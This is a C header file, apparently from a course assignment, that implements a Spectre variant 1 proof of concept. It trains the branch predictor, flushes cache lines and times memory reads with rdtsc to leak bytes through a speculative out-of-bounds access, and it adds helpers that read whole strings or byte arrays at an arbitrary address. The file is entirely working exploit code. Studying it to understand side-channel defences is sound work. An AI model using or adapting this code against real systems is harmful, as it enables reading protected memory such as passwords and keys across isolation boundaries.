//
// Created by me on 22.01.2021.
//

#ifndef HW6__SPECTRE_H_
#define HW6__SPECTRE_H_

#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define MIN_ITERATIONS 2
#define BRANCH_TRAINS 20
#define PAGE_SIZE 2048
//#define PAGE_SIZE (1<<20)
#define CUTOFF_TIME 500
#define CACHE_HIT_COEFF 3

#define    __unused    __attribute__((__unused__))

FILE *output = NULL;

#define side_effects_size (256L * PAGE_SIZE)
uint8_t *side_effects;
size_t array_size = BRANCH_TRAINS;
volatile uint8_t base_array[BRANCH_TRAINS];
uint64_t temp;

void init_spectre() {
  side_effects = malloc(side_effects_size);
  memset(side_effects, 0xda, side_effects_size); // Not zero because 0-page
  memset((uint8_t *) base_array, 0, BRANCH_TRAINS);
}

uint8_t __attribute__((noinline)) victim_function(uint64_t i) {
  if (i < array_size)
    return side_effects[base_array[i] * PAGE_SIZE];
  return 0;
}

uint8_t read_at(uint64_t addr) {
  volatile uint64_t c_sum = 0, c_cnt = 0, c_fail = 0;
  uint64_t c_i_sum[256] = {0}, c_i_cnt[256] = {0};
  addr -= (uint64_t) &base_array; // address relative to our array
  for (volatile uint64_t t_iter = 0;; t_iter++) {
    for (volatile uint64_t i = 0; i < BRANCH_TRAINS; i++) { // training
      victim_function(i);
    }
//    _mm_clflush(&side_effects[0]);
    _mm_clflush(&array_size);
    _mm_clflush(&side_effects[0]);
    for (uint64_t i = 0; i < BRANCH_TRAINS; i++) {
      _mm_clflush((uint64_t *) &base_array[i]);
    }
//    _mm_clflush((uint64_t *) &base_array);
    victim_function(addr);

    for (volatile uint64_t i = 0; i < 256; i++) {
      __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
      uint64_t start = __rdtsc();
      __sync_synchronize();
      temp = side_effects[i * PAGE_SIZE];
      __sync_synchronize();
      uint64_t time = __rdtsc() - start;
      _mm_clflush(&side_effects[i * PAGE_SIZE]);
      // If the read is abnormally slow we have to start over - got interrupted by the OS.
      if (time > CUTOFF_TIME) {
        c_fail++;
        continue;
      }
      if (t_iter > MIN_ITERATIONS && c_i_cnt[i]) {
        uint64_t average = (c_sum - c_i_sum[i]) / (c_cnt - c_i_cnt[i]);
        if (time * CACHE_HIT_COEFF < average) {// faster than else's average - that's a cache hit.
          if (output != NULL) {
            fprintf(output,
                    "%p = %c - page takes %lld cycles to read (average = %llu) (took %llu iterations, %llu reads (%llu fails) and %llu cycles)\n",
                    (void *) addr,
                    (char) i,
                    (long long) time,
                    (long long) average,
                    (long long) t_iter,
                    (long long) c_cnt,
                    (long long) c_fail,
                    (long long) c_sum);
          }
          return i;
        }
      }
      c_sum += time;
      c_cnt++;
      c_i_sum[i] += time;
      c_i_cnt[i]++;
    }
  }
}

char *read_byte_string_at(uint64_t addr) {
  size_t capacity = 1;
  char *a = malloc(capacity);
  size_t read = 0;
  do {
    a[read] = read_at(addr + read);
    read++;
    if (read == capacity) {
      capacity *= 2;
      a = realloc(a, capacity);
    }
  } while (a[read - 1]);
  a = realloc(a, read);
  return a;
}

uint8_t *read_byte_array_at(uint64_t addr, size_t num) {
  uint8_t *a = malloc(num);
  for (size_t offset = 0; offset < num; offset++) {
    a[offset] = read_at(addr + offset);
  }
  return a;
}

#endif //HW6__SPECTRE_H_
